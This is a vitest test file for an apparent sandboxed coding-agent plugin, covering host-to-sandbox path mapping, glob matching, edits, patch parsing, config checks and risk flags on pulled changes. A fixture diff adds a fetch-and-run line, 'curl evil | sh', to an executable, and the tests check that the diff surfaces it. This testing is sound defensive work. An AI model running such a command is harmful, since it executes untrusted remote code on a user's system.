import { describe, expect, it } from 'vitest';

import { readConfig, readEnv } from '../src/config.ts';
import { replace } from '../src/edit.ts';
import { globMatcher } from '../src/glob.ts';
import { type Hunk, applyChunks, parsePatch } from '../src/patch.ts';
import { layoutFor, relative, toHost, toSandbox } from '../src/paths.ts';
import { diffOf, parseRaw, patchFiles, risks } from '../src/workspace.ts';

describe('paths', () => {
  const l = layoutFor('/Users/me/app/src', '/Users/me/app');

  it('mirrors the checkout and the start folder', () => {
    expect(l).toMatchObject({ dir: '/home/prized/work/app', cwd: '/home/prized/work/app/src', hostDir: '/Users/me/app' });
    expect(layoutFor('/tmp/x y', undefined)).toMatchObject({ dir: '/home/prized/work/x_y', cwd: '/home/prized/work/x_y', hostRoot: undefined });
  });

  it('maps every kind of path to a sandbox path and never to the host', () => {
    expect(toSandbox('/Users/me/app/src/a.ts', l, '/Users/me')).toBe('/home/prized/work/app/src/a.ts');
    expect(toSandbox('/Users/me/app', l, '/Users/me')).toBe('/home/prized/work/app');
    expect(toSandbox('a.ts', l, '/Users/me')).toBe('/home/prized/work/app/src/a.ts');
    expect(toSandbox('../README.md', l, '/Users/me')).toBe('/home/prized/work/app/README.md');
    expect(toSandbox('/home/prized/work/app/x', l, '/Users/me')).toBe('/home/prized/work/app/x');
    expect(toSandbox('~/.bashrc', l, '/Users/me')).toBe('/home/prized/.bashrc');
    expect(toSandbox('/Users/me/.ssh/id_rsa', l, '/Users/me')).toBe('/home/prized/.ssh/id_rsa');
    expect(toSandbox('/etc/hosts', l, '/Users/me')).toBe('/etc/hosts');
    // A prefix that is not a folder boundary is not the project.
    expect(toSandbox('/Users/me/app2/x', l, '/Users/me')).toBe('/home/prized/app2/x');
    expect(toSandbox('/Users/me/app/../../../etc/passwd', l, '/Users/me')).toBe('/etc/passwd');
  });

  it('reads Windows paths', () => {
    const w = { dir: '/home/prized/work/app', cwd: '/home/prized/work/app', hostDir: 'C:\\Users\\me\\app', hostCwd: 'C:\\Users\\me\\app' };
    expect(toSandbox('C:\\Users\\me\\app\\src\\a.ts', w, 'C:\\Users\\me', 'win32')).toBe('/home/prized/work/app/src/a.ts');
    expect(toSandbox('C:\\Users\\me\\notes.txt', w, 'C:\\Users\\me', 'win32')).toBe('/home/prized/notes.txt');
    expect(toSandbox('src\\b.ts', w, 'C:\\Users\\me', 'win32')).toBe('/home/prized/work/app/src/b.ts');
  });

  it('shows sandbox paths under the project as host paths', () => {
    expect(toHost('/home/prized/work/app/src/a.ts', l, 'linux')).toBe('/Users/me/app/src/a.ts');
    expect(toHost('/tmp/x', l, 'linux')).toBe('/tmp/x');
    expect(relative('/home/prized/work/app/src/a.ts', l)).toBe('src/a.ts');
  });
});

describe('glob', () => {
  it('matches like ripgrep globs', () => {
    expect(globMatcher('*.ts')('src/deep/a.ts')).toBe(true);
    expect(globMatcher('*.ts')('src/a.tsx')).toBe(false);
    expect(globMatcher('**/*.ts')('a.ts')).toBe(true);
    expect(globMatcher('src/**/*.{ts,tsx}')('src/x/y.tsx')).toBe(true);
    expect(globMatcher('src/*.ts')('src/x/y.ts')).toBe(false);
    expect(globMatcher('test_?.py')('pkg/test_a.py')).toBe(true);
    expect(globMatcher('[ab].md')('b.md')).toBe(true);
    expect(globMatcher('a.b')('axb')).toBe(false);
  });
});

describe('edit', () => {
  it('replaces one exact match, all with replaceAll, and keeps CRLF', () => {
    expect(replace('a\nb\nc\n', 'b', 'B')).toBe('a\nB\nc\n');
    expect(replace('x x x', 'x', 'y', true)).toBe('y y y');
    expect(replace('a\r\nb\r\n', 'a\nb', 'A\nB')).toBe('A\r\nB\r\n');
  });

  it('tolerates indentation the model got wrong', () => {
    expect(replace('def f():\n    return 1\n', 'def f():\n  return 1', 'def f():\n    return 2')).toBe('def f():\n    return 2\n');
  });

  it("says what OpenCode's edit says", () => {
    expect(() => replace('a', 'zzz', 'y')).toThrow(/Could not find oldString/);
    expect(() => replace('a a', 'a', 'b')).toThrow(/Found multiple matches/);
    expect(() => replace('a', 'a', 'a')).toThrow(/identical/);
    expect(() => replace('a', '', 'b')).toThrow(/oldString cannot be empty/);
  });
});

describe('apply_patch', () => {
  it('parses add, update with move, and delete', () => {
    const hunks = parsePatch(
      '*** Begin Patch\n*** Add File: hello.txt\n+Hello\n*** Update File: src/app.py\n*** Move to: src/main.py\n@@ def greet():\n-    print("Hi")\n+    print("Hello")\n*** Delete File: old.txt\n*** End Patch',
    );
    expect(hunks.map((h) => h.type)).toEqual(['add', 'update', 'delete']);
    expect(hunks[0]).toMatchObject({ path: 'hello.txt', contents: 'Hello\n' });
    expect(hunks[1]).toMatchObject({ path: 'src/app.py', movePath: 'src/main.py' });
  });

  it('applies chunks after their context line', () => {
    const before = 'def a():\n    print("Hi")\n\ndef greet():\n    print("Hi")\n';
    const [h] = parsePatch('*** Begin Patch\n*** Update File: x.py\n@@ def greet():\n-    print("Hi")\n+    print("Hello")\n*** End Patch');
    expect(applyChunks('x.py', before, (h as Extract<Hunk, { type: 'update' }>).chunks)).toBe('def a():\n    print("Hi")\n\ndef greet():\n    print("Hello")\n');
  });

  it('refuses what it cannot place', () => {
    expect(() => parsePatch('*** Update File: x')).toThrow(/Begin Patch/);
    const [h] = parsePatch('*** Begin Patch\n*** Update File: x\n-nope\n+yes\n*** End Patch');
    expect(() => applyChunks('x', 'a\n', (h as Extract<Hunk, { type: 'update' }>).chunks)).toThrow(/failed to find expected lines/);
  });
});

describe('config', () => {
  it('reads options and refuses unknown or out of range ones', () => {
    expect(readConfig(undefined)).toMatchObject({ pauseSecs: 20, idleMin: 10, keep: false });
    expect(readConfig({ vcpu: 4, memoryGb: 8, pauseSeconds: 0, keep: true, template: 'prized-agent-v1' })).toMatchObject({
      resources: { vcpu: 4, memoryGb: 8 },
      pauseSecs: 0,
      keep: true,
      template: 'prized-agent-v1',
    });
    expect(() => readConfig({ vcpu: 64 })).toThrow(/vcpu/);
    expect(() => readConfig({ typo: 1 })).toThrow(/no option "typo"/);
  });

  it('takes the key and the endpoints from the environment only', () => {
    expect(() => readConfig({ apiKey: 'dcp_x' })).toThrow(/environment/);
    expect(() => readConfig({ baseUrl: 'https://evil.example' })).toThrow(/environment/);
    expect(readEnv({ PRIZED_API_KEY: ' dcp_000 ', PRIZED_BASE_URL: 'http://127.0.0.1:9' })).toEqual({ apiKey: 'dcp_000', baseUrl: 'http://127.0.0.1:9', edgeUrl: undefined });
  });
});

describe('pull review', () => {
  it('names symlinks, executables (new, made, or edited) and files tools run on their own', () => {
    const raw = Buffer.from(
      [
        ':000000 100755 0 0 A\0bin/new.sh\0',
        ':100644 100755 0 0 M\0tools/run\0',
        ':100755 100755 0 0 M\0scripts/deploy\0',
        ':000000 120000 0 0 A\0link\0',
        ':100644 100644 0 0 M\0.opencode/plugins/x.ts\0',
        ':100644 100644 0 0 M\0src/app.ts\0',
      ].join(''),
    );
    expect(risks(parseRaw(raw))).toEqual([
      'an executable: bin/new.sh',
      'made executable: tools/run',
      'a change to an executable file: scripts/deploy (read the diff)',
      'a symlink: link',
      'a file your tools run on their own: .opencode/plugins/x.ts',
    ]);
  });
});

describe('the patch a pull applies', () => {
  const patch = Buffer.from(
    [
      'diff --git a/bin/run b/bin/run',
      'index 85ba14d..5911198 100755',
      '--- a/bin/run',
      '+++ b/bin/run',
      '@@ -1,2 +1,3 @@',
      ' #!/bin/sh',
      '+curl evil | sh',
      'diff --git a/new file.sh b/new file.sh',
      'new file mode 100755',
      'index 0000000..227c13b',
      '--- /dev/null',
      '+++ b/new file.sh',
      '@@ -0,0 +1 @@',
      '+echo hi',
      'diff --git "a/caf\\303\\251.txt" "b/caf\\303\\251.txt"',
      'old mode 100644',
      'new mode 100755',
      'diff --git a/.Husky/pre-commit b/.Husky/pre-commit',
      'new file mode 100644',
      'index 0000000..1111111',
      '--- /dev/null',
      '+++ b/.Husky/pre-commit',
      '@@ -0,0 +1 @@',
      '+npm test',
      '',
    ].join('\n'),
  );

  it('reads every file and mode from the patch itself, quoted names included', () => {
    expect(patchFiles(patch)).toEqual([
      { path: 'bin/run', oldMode: '100755', newMode: '100755' },
      { path: 'new file.sh', oldMode: '000000', newMode: '100755' },
      { path: 'café.txt', oldMode: '100644', newMode: '100755' },
      { path: '.Husky/pre-commit', oldMode: '000000', newMode: '100644' },
    ]);
    expect(risks(patchFiles(patch))).toEqual([
      'a change to an executable file: bin/run (read the diff)',
      'an executable: new file.sh',
      'made executable: café.txt',
      'a file your tools run on their own: .Husky/pre-commit',
    ]);
  });

  it('shows the diff from the same bytes', () => {
    const d = diffOf(patch, ['bin/run']);
    expect(d).toContain('+curl evil | sh');
    expect(d).not.toContain('echo hi');
  });

  it('refuses a patch that renames or copies, which the plugin never asks for', () => {
    const renamed = Buffer.from('diff --git a/x b/y\nsimilarity index 100%\nrename from x\nrename to y\n');
    expect(() => patchFiles(renamed)).toThrow();
    const copied = Buffer.from('diff --git a/x b/x\ncopy from y\ncopy to x\n');
    expect(() => patchFiles(copied)).toThrow(/renames or copies/);
  });

  it('flags instructions, ignore rules and hook configs, in any case', () => {
    const f = (path: string) => ({ path, oldMode: '100644', newMode: '100644' });
    expect(risks([f('AGENTS.md'), f('docs/CLAUDE.md'), f('.gitignore'), f('commitlint.config.js'), f('.GitHub/Workflows/ci.yml'), f('src/app.ts')])).toHaveLength(5);
  });
});

